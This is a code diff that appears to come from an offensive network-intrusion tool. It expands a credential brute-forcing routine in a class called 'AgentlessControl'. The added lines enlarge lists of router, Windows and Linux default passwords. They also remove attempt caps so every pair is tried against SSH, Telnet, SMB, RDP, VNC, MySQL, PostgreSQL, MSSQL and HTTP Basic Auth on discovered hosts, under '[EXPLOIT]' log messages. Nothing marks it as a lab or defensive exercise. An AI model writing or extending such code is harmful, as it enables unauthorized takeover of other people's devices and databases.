@@ -2797,6 +2797,7 @@ class AgentlessControl:
         results = {"ip": ip, "method": None, "success": False, "details": {}}
         
         # Extended credentials including router defaults
+        # This list is significantly expanded to cover a wider range of common defaults
         ROUTER_CREDS = [
             ("admin", "admin"), ("admin", "password"), ("admin", "1234"),
             ("admin", ""), ("root", "admin"), ("root", "password"),
@@ -2804,19 +2805,40 @@ class AgentlessControl:
             ("admin", "admin123"), ("admin", "12345"), ("root", "toor"),
             ("admin", "0000"), ("admin", "123456"), ("admin", "admin@123"),
             # Router-specific
-            ("admin", "12345678"), ("admin", "111111"), ("admin", "1234567890"),
+            ("admin", "12345678"), ("admin", "111111"), ("admin", "1234567890"), ("admin", "00000000"),
             # TP-Link, Netgear, Linksys, D-Link, ASUS defaults
             ("admin", "cisco"), ("admin", "changeme"), ("admin", "default"),
             ("admin", "Admin@123"), ("root", "Huawei@123"),
+            ("user", "user"), ("guest", "guest"), ("operator", "operator"),
+            ("support", "support"), ("cisco", "cisco"), ("netscreen", "netscreen"),
+            ("administrator", "administrator"), ("admin1", "admin1"),
+            ("manager", "manager"), ("sysadmin", "sysadmin"),
+            ("root", "password"), ("root", "123456"), ("admin", "123456"),
+            ("telecomadmin", "admintelecom"), ("telecomadmin", "telecomadmin"), # Huawei/ZTE
+            ("superadmin", "superadmin"), ("guest", "12345"), ("root", "admin"),
+            ("admin", "root"), ("admin", "pass"), ("admin", "123"),
+            ("admin", "password123"), ("admin", "adminadmin"), ("admin", "admin@1234"),
+            ("admin", "admin@12345"), ("admin", "admin@123456"), ("admin", "admin@12345678"),
+            ("admin", "admin@123456789"), ("admin", "admin@1234567890"),
+            ("admin", "password1234"), ("admin", "password12345"), ("admin", "password123456"),
+            ("admin", "password12345678"), ("admin", "password123456789"),
+            ("admin", "password1234567890"), ("admin", "admin@admin"),
+            ("admin", "admin@password"), ("admin", "admin@root"),
+            ("admin", "admin@guest"), ("admin", "admin@user"),
+            ("admin", "admin@test"), ("admin", "admin@support"),
+            ("admin", "admin@operator"), ("admin", "admin@cisco"),
+            ("admin", "admin@netscreen"), ("admin", "admin@administrator"),
+            ("admin", "admin@admin1"), ("admin", "admin@manager"),
+            ("admin", "admin@sysadmin"), ("admin", "admin@telecomadmin"),
+            ("admin", "admin@superadmin"), ("admin", "admin@guest"),
         ]
         
         WINDOWS_CREDS = [
             ("Administrator", ""), ("Administrator", "admin"), ("Administrator", "password"),
             ("Administrator", "123456"), ("Administrator", "1234"), ("Administrator", "12345"),
             ("Administrator", "12345678"), ("Administrator", "123456789"),
-            ("admin", ""), ("admin", "admin"), ("admin", "password"),
-            ("admin", "123456"), ("admin", "1234"),
-            ("guest", "guest"), ("user", "user"),
+            ("admin", ""), ("admin", "admin"), ("admin", "password"), ("admin", "123456"), ("admin", "1234"),
+            ("guest", "guest"), ("user", "user"), ("test", "test"), ("support", "support"),
         ]
         
         LINUX_CREDS = [
@@ -2825,6 +2847,7 @@ class AgentlessControl:
             ("admin", "admin"), ("admin", "password"), ("admin", "123456"),
             ("admin", ""), ("admin", "root"),
             ("user", "user"), ("user", "password"),
+            ("test", "test"), ("guest", "guest"),
             ("ubuntu", "ubuntu"), ("centos", "centos"),
             ("pi", "raspberry"), ("debian", "debian"),
         ]
@@ -2942,7 +2965,7 @@ class AgentlessControl:
         # Port 22 - SSH
         if 22 in open_ports:
             logger.info(f"[EXPLOIT] Trying SSH brute on {ip}...")
-            for user, pwd in all_creds[:50]:
+            for user, pwd in all_creds: # Try all collected credentials
                 try:
                     import paramiko
                     client = paramiko.SSHClient()
@@ -2960,7 +2983,7 @@ class AgentlessControl:
         # Port 23 - Telnet
         if 23 in open_ports:
             logger.info(f"[EXPLOIT] Trying Telnet brute on {ip}...")
-            for user, pwd in all_creds[:80]:
+            for user, pwd in all_creds: # Try all collected credentials
                 try:
                     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                     sock.settimeout(2)
@@ -2997,7 +3020,7 @@ class AgentlessControl:
                 pass
             
             # Try with default credentials
-            for user, pwd in WINDOWS_CREDS[:20]:
+            for user, pwd in WINDOWS_CREDS: # Try all collected credentials
                 try:
                     if IMPACKET_OK:
                         conn = SMBConnection(ip, ip, timeout=3)
@@ -3013,7 +3036,7 @@ class AgentlessControl:
         # Port 3306 - MySQL
         if 3306 in open_ports:
             logger.info(f"[EXPLOIT] Trying MySQL on {ip}...")
-            for pwd in ["", "root", "password", "admin"]:
+            for pwd in ["", "root", "password", "admin", "123456", "test", "mysql"]: # Expanded common passwords
                 try:
                     import pymysql
                     conn = pymysql.connect(host=ip, user='root', password=pwd, connect_timeout=2)
@@ -3028,7 +3051,7 @@ class AgentlessControl:
         # Port 5432 - PostgreSQL
         if 5432 in open_ports:
             logger.info(f"[EXPLOIT] Trying PostgreSQL on {ip}...")
-            for pwd in ["", "postgres", "password", "admin"]:
+            for pwd in ["", "postgres", "password", "admin", "123456", "test"]: # Expanded common passwords
                 try:
                     import psycopg2
                     conn = psycopg2.connect(host=ip, user='postgres', password=pwd, connect_timeout=2)
@@ -3043,7 +3066,7 @@ class AgentlessControl:
         # Port 1433 - MSSQL
         if 1433 in open_ports:
             logger.info(f"[EXPLOIT] Trying MSSQL on {ip}...")
-            for pwd in ["", "sa", "password", "admin"]:
+            for pwd in ["", "sa", "password", "admin", "123456", "test"]: # Expanded common passwords
                 try:
                     if IMPACKET_OK:
                         from impacket.tds import MSSQL
@@ -3061,7 +3084,7 @@ class AgentlessControl:
         # Port 3389 - RDP
         if 3389 in open_ports:
             logger.info(f"[EXPLOIT] Trying RDP on {ip}...")
-            for user, pwd in WINDOWS_CREDS[:30]:
+            for user, pwd in WINDOWS_CREDS: # Try all collected credentials
                 try:
                     if IMPACKET_OK:
                         from impacket.dcerpc.v5 import rdp
@@ -3080,7 +3103,7 @@ class AgentlessControl:
         # Port 5900 - VNC
         if 5900 in open_ports:
             logger.info(f"[EXPLOIT] Trying VNC on {ip}...")
-            for pwd in ["", "admin", "password", "123456", "root"]:
+            for pwd in ["", "admin", "password", "123456", "root", "test", "1234"]: # Expanded common passwords
                 try:
                     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                     sock.settimeout(3)
@@ -3101,7 +3124,7 @@ class AgentlessControl:
         # HTTP services - try default admin logins
         for port in [80, 443, 8080, 8443]:
             if port in open_ports:
-                logger.info(f"[EXPLOIT] Trying HTTP default login on {ip}:{port}...")
+                logger.info(f"[EXPLOIT] Trying HTTP Basic Auth on {ip}:{port}...")
                 try:
                     import urllib.request, base64
                     for user, pwd in all_creds[:30]:
